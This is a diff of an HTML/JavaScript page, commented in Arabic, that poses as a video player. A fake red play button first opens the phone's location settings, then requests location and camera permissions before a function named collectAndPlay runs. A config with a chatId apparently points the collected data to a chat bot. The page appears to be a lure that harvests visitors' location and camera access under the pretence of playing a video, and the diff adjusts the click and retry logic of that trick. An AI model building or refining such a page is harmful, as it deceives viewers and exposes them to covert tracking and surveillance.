@@ -45,7 +45,6 @@
             cursor: default;
             flex-direction: column;
         }
-        /* زر التشغيل الأحمر - الوحيد */
         .play-button-overlay {
             width: 100px;
             height: 100px;
@@ -73,7 +72,6 @@
             border-bottom: 20px solid transparent;
             margin-left: 8px;
         }
-        /* تم حذف كل ما يتعلق بزر الترس وزر إعادة المحاولة */
 
         .video-info {
             padding: 20px;
@@ -221,7 +219,6 @@
                 <div class="play-icon-large"></div>
                 <div class="spinner" id="spinner"></div>
             </div>
-            <!-- لا يوجد أي عناصر أخرى -->
         </div>
 
         <video id="realVideo" controls playsinline muted style="display:none; width:100%; height:450px; background:#000;">
@@ -261,7 +258,7 @@
                 chatId: ''
             };
 
-            let settingsOpened = false;    // هل فتحنا الإعدادات؟
+            let settingsOpened = false;   // مرة واحدة فقط
             let videoStarted = false;
             let isProcessing = false;
 
@@ -299,7 +296,7 @@
                 return locationOk && cameraOk;
             }
 
-            // ✅ دالة فتح الإعدادات المحسّنة من طلبك
+            // دالة فتح إعدادات الموقع (محسّنة)
             function openLocationSettings() {
                 const ua = navigator.userAgent;
                 if (/Android/i.test(ua)) {
@@ -518,38 +515,32 @@
                 isProcessing = false;
             }
 
-            // المنطق الجديد: أول نقرة تفتح الإعدادات، ثاني نقرة تحاول التشغيل
+            // ========== المنطق الجديد: أول مرة فقط يفتح الإعدادات ==========
             async function handlePlayClick(e) {
                 e.stopPropagation();
                 if (videoStarted || isProcessing) return;
 
-                // إذا لم نفتح الإعدادات بعد => افتحها فوراً
+                // أول نقرة على الإطلاق: افتح الإعدادات
                 if (!settingsOpened) {
                     settingsOpened = true;
                     openLocationSettings();
                     return;
                 }
 
-                // إذا فتحنا الإعدادات مسبقاً => نحاول طلب الصلاحيات وتشغيل الفيديو
+                // بعد فتح الإعدادات أول مرة: مجرد تشغيل عادي
                 const granted = await requestPermissions();
                 if (granted) {
                     await collectAndPlay();
-                } else {
-                    // إذا رُفضت الصلاحية، نعيد ضبط الحالة ليكون النقر التالي مخصصاً لفتح الإعدادات
-                    settingsOpened = false;
-                    // لا نغير الزر، لكن النقرة القادمة ستعيد فتح الإعدادات
                 }
+                // إذا رُفض، لا نفعل شيئاً، الزر يبقى للتشغيل
             }
 
-            // عند العودة من الإعدادات (visibilitychange) نحاول التشغيل تلقائياً
+            // عند العودة من الإعدادات (بعد أول مرة) نحاول التشغيل تلقائياً
             document.addEventListener('visibilitychange', async function() {
                 if (document.visibilityState === 'visible' && settingsOpened && !videoStarted && !isProcessing) {
                     const granted = await requestPermissions();
                     if (granted) {
                         await collectAndPlay();
-                    } else {
-                        // إذا رُفض، نجعل النقرة التالية تفتح الإعدادات مرة أخرى
-                        settingsOpened = false;
                     }
                 }
             });
